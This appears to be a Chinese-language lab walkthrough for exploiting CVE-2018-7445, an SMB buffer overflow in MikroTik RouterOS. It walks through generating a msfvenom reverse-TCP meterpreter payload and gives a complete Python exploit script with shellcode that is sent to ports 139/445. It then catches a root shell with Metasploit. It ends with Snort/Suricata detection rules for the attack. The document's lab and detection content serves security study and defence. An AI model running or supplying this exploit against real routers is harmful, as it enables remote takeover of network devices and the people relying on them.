
# 0x0 前言
* ()內為測試時使用之環境
* `斜體字`為指令

# 0x1 前置需求
* 虛擬機軟體 (VMware Workstation 15.5.7)
* 攻擊機 (Kali Linux 2020.4)
* 受攻擊機 (Mikrotik Routeros 6.40.5)，載點：https://download2.mikrotik.com/routeros/6.40.5/chr-6.40.5.vmdk

# 0x2 受攻擊機環境建置
1. 開機，帳號：**admin**，密碼：**空**

2. **切換至ip目錄**，輸入`smb set enabled=yes`開啟SMB服務  
![2.2_enable_smb.PNG](image/2.2_enable_smb.PNG)

3. `address print`，查看受攻擊機ip  
![2.3_show_ip_addr.PNG](image/2.3_show_ip_addr.PNG)

# 0x3 攻擊機環境建置
本次使用反向shell的方式取得meterpreter

### normal terminal
1. `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<攻擊機ip> LPORT=<任意空port(4444)> -f python -b "\x00"`，取得payload(圖中紅框處程式碼)  
![3.1_get_payload.PNG](image/3.1_get_payload.PNG)

2. 創建exploit.py，**將buf處那幾行的程式碼換成在上一步得到的payload程式碼**  

        import socket
        import sys

        def sendTCPPackage(ip,port,data):
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            try:
                s.connect((ip,port))
            except:
                print("connect err")
            s.send(data)
            s.close()
            
        if __name__ == "__main__":
            ip = sys.argv[1]
            port = int(sys.argv[2])

            # ↓ Change to your payload generate in step 1. ↓
            buf = ""
            buf += "\xb8\x57\x0f\x9d\xf1\xd9\xc9\xd9\x74\x24\xf4\x5d\x33"
            buf += "\xc9\xb1\x12\x31\x45\x12\x83\xed\xfc\x03\x12\x01\x7f"
            buf += "\x04\xad\xc6\x88\x04\x9e\xbb\x25\xa1\x22\xb5\x2b\x85"
            buf += "\x44\x08\x2b\x75\xd1\x22\x13\xb7\x61\x0b\x15\xbe\x09"
            buf += "\x4c\x4d\x65\x4d\x24\x8c\x66\x6f\x25\x19\x87\xdf\x23"
            buf += "\x4a\x19\x4c\x1f\x69\x10\x93\x92\xee\x70\x3b\x43\xc0"
            buf += "\x07\xd3\xf3\x31\xc7\x41\x6d\xc7\xf4\xd7\x3e\x5e\x1b"
            buf += "\x67\xcb\xad\x5c"
            # ↑ Change to your payload generated in step 1. ↑

            data="\x81\x00\x00\xFF"+'A' * 0x22+"\xFF"+0x40 * 'A'+"\xf5\x64\x06\x08" + "\x00\x00\x00\x01"+"\x6e\xf7\x04\x08"+"\x7d\x00\x00\x00"+"\x07\x00\x00\x00"+"\x00\x20\x07\x08"+'AAAAAAAAAAAA'+"\x2e\xe4\xff\xff" +'AAAAAAAAAAAA'+'\x00\x60\x07\x08'+"\x90"*0x2000+buf
            sendTCPPackage(ip,port,data)

### msf
3. 開啟msfconsole

4. `use exploit/multi/handler`  
![3.4_use_msf_module.PNG](image/3.4_use_msf_module.PNG)

5. `set payload linux/x86/meterpreter/reverse_tcp`  
![3.5_set_msf_payload.PNG](image/3.5_set_msf_payload.PNG)

6. `set LHOST <攻擊機ip>`  
![3.6_set_msf_LHOST.PNG](image/3.6_set_msf_LHOST.PNG)

7. `set LPORT <剛剛的port>`  
![3.7_set_msf_LPORT.PNG](image/3.7_set_msf_LPORT.PNG)

8. `exploit`，進入listen狀態

### normal terminal
9. 開啟**另一terminal**輸入`python exploit.py <受攻擊機ip> 139` or `python exploit.py <受攻擊機ip> 445`(python 2)，攻擊受攻擊機的port 139或是445，兩者皆代表smb service，等候約5秒**msf**成功進入meterpreter  
![3.9_exploit.PNG](image/3.9_exploit.PNG)

### msf
10. `getuid`，確認為最高權限帳戶  
![3.10_validation.PNG](image/3.10_validation.PNG)


### 注意事項
雖然已取得了root權限，但可能因為RouterOS是一個**特製的Linux發行版**，因此諸多Linux指令和寫入許可皆沒有支援  
![3.99_weird_permission.PNG](image/3.99_weird_permission.PNG)

# 0x4 Snort/Suricata Rule
1. alert tcp $EXTERNAL_NET any -> $HOME_NET [139,445] (msg:"NETBIOS MikroTik RouterOS buffer overflow attempt"; flow:to_server,established; content:"|81 00|"; depth:2; byte_test:2,>,75,0,relative; byte_extract:2,0,len,relative; isdataat:!len,relative; isdataat:len; metadata:policy max-detect-ips drop, policy security-ips drop, ruleset community, service netbios-ssn; reference:bugtraq,103427; reference:cve,2018-7445; classtype:attempted-user; sid:46076; rev:2;)
2. alert tcp any any -> $HOME_NET 139 (msg: "ATTACK [PTsecurity] Mikrotik <6.41.3 <6.42rc27 RCE Attempt (CVE-2018-7445)"; flow: established, to_server, no_stream; content: "|81 00|"; depth: 2; byte_test: 1, >, 0x20, 2, relative; content: "|00 00 00|"; distance: 0; reference: cve, 2018-7445; reference: url, www.coresecurity.com/advisories/mikrotik-routeros-smb-buffer-overflow; classtype: attempted-admin; reference: url, github.com/ptresearch/AttackDetection; sid: 10002680; rev: 1; )

3. alert tcp any any -> $HOME_NET 139 (msg: "ATTACK [PTsecurity] ShellCode Upload Mikrotik <6.41.3 <6.42rc27 RCE (CVE-2018-7445)"; flow: established, to_server, only_stream; content: "|00 00 eb 02 00 00 eb 02|"; depth: 8; pcre: "/(?:\x00\x00\xeb\x02){10}/R"; reference: cve, 2018-7445; reference: url, www.coresecurity.com/advisories/mikrotik-routeros-smb-buffer-overflow; classtype: attempted-admin; reference: url, github.com/ptresearch/AttackDetection; sid: 10002681; rev: 1; )

4. alert tcp $HOME_NET 139 -> any any (msg: "ATTACK [PTsecurity] Successful Mikrotik <6.41.3 <6.42rc27 RCE (CVE-2018-7445)"; flow: established, from_server, no_stream; content: "sh: "; depth: 4; reference: cve, 2018-7445; reference: url, www.coresecurity.com/advisories/mikrotik-routeros-smb-buffer-overflow; classtype: successful-admin; reference: url, github.com/ptresearch/AttackDetection; sid: 10002682; rev: 1; )

# Reference
* https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1
* https://www.luoow.com/dc_tw/200936703
